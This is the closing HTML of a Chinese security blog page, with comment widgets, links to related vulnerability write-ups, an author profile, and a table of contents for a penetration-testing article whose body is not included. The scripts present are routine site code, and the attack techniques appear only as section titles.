+    <hr class="bg-gray-300 dark:bg-gray-300 my-10">
+
+    
+        
+        
+        <div class="comments">
+            <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'forecho-blog';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="Secd0g/comment"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+  
+        </div>
+
+        <div class="related my-5">
+            
+
+
+<div class="p-8 mt-6 lg:mt-0 rounded shadow bg-white dark:bg-gray-800">
+    <h2 class="font-sans font-bold break-normal text-gray-700 px-2 pb-3 text-xl dark:text-gray-300">相关文章</h2>
+    
+    <li><a href="/an-app-distribution-system-upload-vulnerability.html" class="underline text-yellow-600">某云分发APP上传漏洞</a></li>
+    
+    <li><a href="/analysis-of-php-deserialization-vulnerabilities.html" class="underline text-yellow-600">浅析PHP反序列化漏洞</a></li>
+    
+    <li><a href="/zzzphp1.61-code-auditing-from-injecting-to-taking-a-shell.html" class="underline text-yellow-600">zzzphp1.61 代码审计-从SQL注入到Getshell</a></li>
+    
+    <li><a href="/seacms8.7-sql-injection-analysis.html" class="underline text-yellow-600">Seacms 8.7版本SQL注入分析</a></li>
+    
+    <li><a href="/2019.html" class="underline text-yellow-600">2019年我来了！</a></li>
+    
+</div>
+
+        </div>
+
+    
+
+</section>
+
+
+<div class="hidden xl:text-sm xl:block xl:w-1/4 xl:px-6 ">
+
+    <div class="lg:w-full mx-auto items-center justify-between">
+    <div class="bg-white shadow rounded overflow-hidden dark:bg-gray-800">
+        <div class="bg-cover mx-auto w-32 h-32 mt-5 rounded-full" style="background-image: url('https://avatars.githubusercontent.com/u/16066632?v=4')"> </div>
+        
+        <div class="p-4">
+            <p class="text-2xl text-center pb-2">F0rmat</p>
+            <p class="text-sm text-center text-gray-700 dark:text-gray-300">专注于信息安全、内网渗透、红队攻防</p>
+        </div>
+        <div class="flex p-4 border-t text-sm border-gray-300 text-gray-700 dark:text-gray-300">
+            <div class="flex-1 border-r border-gray-600">
+                <p class="text-center">
+                    <span class="font-bold ">
+                        85
+                    </span>
+                    文章
+                </p>
+            </div>
+            <div class="flex-1 text-center">
+                <p class="text-center">
+                    <span class="font-bold">
+                        
+                            60
+                        
+                    </span>
+                    标签
+                </p>
+            </div>
+        </div>
+        <div class="px-4 pb-4 border-t border-gray-300 dark:text-gray-200">
+            <div class="mt-6 pb-16 lg:pb-0 w-4/5 lg:w-full mx-auto flex flex-wrap items-center  text-gray-500">
+                
+                <a href="//github.com/Secd0g" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="GitHub"><i class="my-iconfont icon-social-github"></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                
+                <a href="//zhihu.com/people/F0rmat" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="zhihu"><i><svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 640 512"><style>svg{fill:#bac5d8}</style><path d="M170.54 148.13v217.54l23.43.01 7.71 26.37 42.01-26.37h49.53V148.13H170.54zm97.75 193.93h-27.94l-27.9 17.51-5.08-17.47-11.9-.04V171.75h72.82v170.31zm-118.46-94.39H97.5c1.74-27.1 2.2-51.59 2.2-73.46h51.16s1.97-22.56-8.58-22.31h-88.5c3.49-13.12 7.87-26.66 13.12-40.67 0 0-24.07 0-32.27 21.57-3.39 8.9-13.21 43.14-30.7 78.12 5.89-.64 25.37-1.18 36.84-22.21 2.11-5.89 2.51-6.66 5.14-14.53h28.87c0 10.5-1.2 66.88-1.68 73.44H20.83c-11.74 0-15.56 23.62-15.56 23.62h65.58C66.45 321.1 42.83 363.12 0 396.34c20.49 5.85 40.91-.93 51-9.9 0 0 22.98-20.9 35.59-69.25l53.96 64.94s7.91-26.89-1.24-39.99c-7.58-8.92-28.06-33.06-36.79-41.81L87.9 311.95c4.36-13.98 6.99-27.55 7.87-40.67h61.65s-.09-23.62-7.59-23.62v.01zm412.02-1.6c20.83-25.64 44.98-58.57 44.98-58.57s-18.65-14.8-27.38-4.06c-6 8.15-36.83 48.2-36.83 48.2l19.23 14.43zm-150.09-59.09c-9.01-8.25-25.91 2.13-25.91 2.13s39.52 55.04 41.12 57.45l19.46-13.73s-25.67-37.61-34.66-45.86h-.01zM640 258.35c-19.78 0-130.91.93-131.06.93v-101c4.81 0 12.42-.4 22.85-1.2 40.88-2.41 70.13-4 87.77-4.81 0 0 12.22-27.19-.59-33.44-3.07-1.18-23.17 4.58-23.17 4.58s-165.22 16.49-232.36 18.05c1.6 8.82 7.62 17.08 15.78 19.55 13.31 3.48 22.69 1.7 49.15.89 24.83-1.6 43.68-2.43 56.51-2.43v99.81H351.41s2.82 22.31 25.51 22.85h107.94v70.92c0 13.97-11.19 21.99-24.48 21.12-14.08.11-26.08-1.15-41.69-1.81 1.99 3.97 6.33 14.39 19.31 21.84 9.88 4.81 16.17 6.57 26.02 6.57 29.56 0 45.67-17.28 44.89-45.31v-73.32h122.36c9.68 0 8.7-23.78 8.7-23.78l.03-.01z"/></svg></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                <a href="/atom.xml" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="RSS"><i class="my-iconfont icon-feed"></i></a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+    <div class="flex flex-col justify-between sticky top-0 pt-12 pb-4 -mt-10 text-gray-600 dark:text-gray-400">
+        <div class="bg-white shadow rounded p-4 mt-5 dark:bg-gray-800">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x01-前言">0x01 前言</a></li>
+    <li><a href="#0x02-信息探测">0x02 信息探测</a></li>
+    <li><a href="#0x03-肝">0x03 肝</a></li>
+    <li><a href="#0x04-新希望-ld_preload">0x04 新希望 LD_PRELOAD</a></li>
+    <li><a href="#0x05-柳暗花明又一村-centos">0x05 柳暗花明又一村-centos</a>
+      <ul>
+        <li><a href="#劫持getuid">劫持getuid()</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x06-脏牛提权">0x06 脏牛提权</a></li>
+    <li><a href="#0x07-持续访问-ssh后门">0x07 持续访问-ssh后门</a></li>
+    <li><a href="#0x08-metaspliot-横向渗透">0x08 metaspliot 横向渗透</a></li>
+    <li><a href="#0x09-擦屁股">0x09 擦屁股</a></li>
+    <li><a href="#0x10-结束">0x10 结束</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div>
+    </div>
+   
+</div> 
+
+    </div>
+    
+    
+<footer class="bg-white dark:bg-gray-800 border-gray-400 shadow mt-10">	
+    <div class="container  mx-auto flex py-8">
+        <div class="w-full text-center text-gray-600 dark:text-gray-400">
+            <p>
+                &copy; 2023 <a  class="text-gray-700 dark:text-gray-300 font-semibold" href="https://xxe.icu">F0rmat&#39;s Blog</a> By F0rmat 
+            </p>
+            
+            <p class="pt-1">
+                Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io/"  class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Hugo</a> 
+                Theme based on <a href="https://github.com/forecho/hugo-theme-echo" class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Echo</a>
+            </p>
+
+            <span id="busuanzi_container">
+              访客数：<span id="busuanzi_value_site_uv"></span> | 访问量 <span id="busuanzi_value_site_pv"></span>
+            </span>
+
+        </div>
+
+    </div>
+    
+   
+    
+<script src="/js/clipboard.min.js"></script>
+   
+
+</footer>
+
+ <script>
+  window.onload = function() {
+    document.getElementById("nav-toggle").onclick = function() {
+      document.getElementById("nav-content").classList.toggle("hidden");
+    };
+
+    var donate = document.getElementById("btn-donate");
+    if (donate) {
+      donate.onclick = function() {
+        document.getElementById("donate-image").classList.remove("hidden");
+        donate.classList.add("hidden");
+      };
+    }
+
+    var hostname = window.location.hostname;
+    var divs = document.querySelectorAll('a[href^="http"]');
+    [].forEach.call(divs, function(div) {
+      url = div.getAttribute("href");
+      var domain = url
+        .replace("http://", "")
+        .replace("https://", "")
+        .split(/[/?#:]/)[0];
+      if (domain !== hostname) {
+        div.setAttribute("target", "_blank");
+      }
+    });
+  };
+
+   
+  
+  var h = document.documentElement,
+    b = document.body,
+    st = "scrollTop",
+    sh = "scrollHeight",
+    progress = document.querySelector("#progress"),
+    scroll;
+  var scrollpos = window.scrollY;
+  var header = document.getElementById("header");
+  var navcontent = document.getElementById("nav-content");
+
+  document.addEventListener("scroll", function() {
+     
+    scroll = ((h[st] || b[st]) / ((h[sh] || b[sh]) - h.clientHeight)) * 100;
+    progress.style.setProperty("--scroll", scroll + "%");
+
+     
+    scrollpos = window.scrollY;
+
+    if (scrollpos > 10) {
+      navcontent.classList.remove("bg-gray-100");
+    } else {
+      navcontent.classList.add("bg-gray-100");
+    }
+  });
+
+  
+  if (localStorage.theme === 'dark' || (!'theme' in localStorage && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+      var lightIcon = document.getElementById("light-icon");
+      var darkIcon = document.getElementById("dark-icon"); 
+      lightIcon.classList.add("hidden");
+      darkIcon.classList.remove("hidden");
+      document.querySelector('html').classList.add('dark')
+  }
+
+  document.getElementById('switchTheme').addEventListener('click', function() {
+    let htmlClasses = document.querySelector('html').classList;
+    var lightIcon = document.getElementById("light-icon");
+    var darkIcon = document.getElementById("dark-icon");
+    if(localStorage.theme == 'dark') {
+        htmlClasses.remove('dark');
+        localStorage.removeItem('theme');
+        darkIcon.classList.add("hidden");
+        lightIcon.classList.remove("hidden");
+    } else {
+        htmlClasses.add('dark');
+        lightIcon.classList.add("hidden");
+        darkIcon.classList.remove("hidden");
+        localStorage.theme = 'dark';
+    }
+  });
+</script>
+
+</body>
+
+</html>
